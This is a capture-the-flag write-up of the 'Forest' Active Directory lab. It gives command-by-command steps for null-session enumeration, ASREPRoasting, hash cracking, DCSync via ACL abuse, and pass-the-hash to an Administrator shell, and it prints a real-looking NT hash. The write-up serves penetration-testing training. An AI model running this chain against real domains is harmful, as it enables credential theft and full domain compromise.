{{<lead>}}
Forest in an easy difficulty Windows Domain Controller. We are able to enumerate domain users through a NULL session. Once we have our list of users, we notice that there is a service account `svc-alfresco`, we then decide to check if there are any account with kerberos pre-authentication enabled. We discover that we are able to get the hash for that service account (ASREPRoasting) and easily crack it, thus gaining a foothold in the domain. We then enumerate the domain with bloodhound just to find that this user has some interesting group memberships and privileges eventually allowing us to perform DCSync and get the Administrator NTLM hash which we then use with winrm to gain an Administrator shell.

```

From the scan results, we got the domain name (`htb.local`) as well as the hostname of the machine (`FOREST`). We can add them to our host file:

```bash
echo -e "10.129.30.97\tFOREST FOREST.htb.local htb.local" >> /etc/hosts
```

## Foothold

### User Enumeration

First let's see if we can enumerate users with `rpcclient` by leveraging a SMB null session:

```bash
rpcclient -N -U "" 10.129.30.97

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

We could have also used `netexec` for this purpose:

```bash
nxc smb 10.129.30.97 -u '' -p '' --users
```

We got back a few users:

```text
Administrator
krbtgt
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

Let's note them somewhere and move on.

### ASREPRoasting

Now that we have a list of users, we could try multiple things such as password spraying for example, but there are other things we could try first. For instance, let's see if among our list of users account there are some that do not require kerberos pre-authentication:

```bash
impacket-GetNPUsers htb.local/ -usersfile users -format hashcat -outputfile asrep_hashes.out

Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:5f9...<SNIP>...63836d7
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

As we can see, the service account `svc-alfresco` does not require kerberos pre-authentication, hence we making it vulnerable to ASREPRoasting.

More on ASREPRoasting -> [https://www.thehacker.recipes/ad/movement/kerberos/asreproast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)

We can now try to crack it with hashcat:

```bash
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
```

{{<figure src="/img/htb/forest/cracked_hash_svcalfresco.png" position=center caption="svc-alfresco password cracked !">}}

Now that we have the password for `svc-alfresco`, let's try to login via winrm:

```bash
evil-winrm -i 10.129.30.97 -u svc-alfresco -p <PASSWORD>
```

We successfully logged in and was able to retrieve the user flag at `C:\Users\svc-alfresco\Desktop\user.txt`

{{<figure src="/img/htb/forest/user_flag.png" position=center caption="User flag obtained !">}}

### Privilege Escalation

Now that we have a foothold in the domain, let's use [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) in order to collect information about the domain that we can than visualize after:

```bash
# Collecting data
bloodhoud-python -u svc-alfresco -p <PASSWORD> -ns 10.129.30.97 -d htb.local -c all
# Zipping the json output files
zip -r data.zip *.json
```

Now that we have our zip file ready, we can start bloodhound and upload the file. After going through the results, we notice that `svc-alfresco`, through nested group memberships, is in the `Account Operators` group which has `GenericAll` privilege on the `Exchange Windows Permissions` group which then have the `WriteDacl` privilege over the domain object.

{{<figure src="/img/htb/forest/bloodhound.png" position=center caption="Path for privilege escalation">}}

With this information, we can do the following:
- Create a new domain user.
- Add that user to the `Exchange Windows Permissions` group by abusing our `GenericAll` privilege.
- As the new user, add `DCSync` privileges to our self by abusing the `WriteDacl` privilege.
- Dump all the hashes

```powershell
# Creating a new domain user (as svc-alfresco)
net user hackerr password123! /add /domain

# Add 'hackerr' to the Exchange Windows Permissions group
net group "Exchange Windows Permissions" hackerr /add

# Add DCSync privileges with
$pass = ConvertTo-SecureString 'password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb.local\hackerr', $pass)
Add-ObjectACL -PrincipalIdentity hackerr -Credential $cred -Rights DCSync
```

Now `hackerr` should have DCSync rights. We can verify by using using impacket's secretsdump:

```bash
impacket-secretsdump htb.local/hackerr:'password123!'@10.129.30.97 -just-dc -outputfile dcsync.out
```

{{<figure src="/img/htb/forest/dcsync.png" position=center caption="DCSync">}}

We can use the Administrator's NThash to login via `winrm`:

```bash
evil-winrm -i 10.129.30.97 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
```

We can then retrive the root flag.
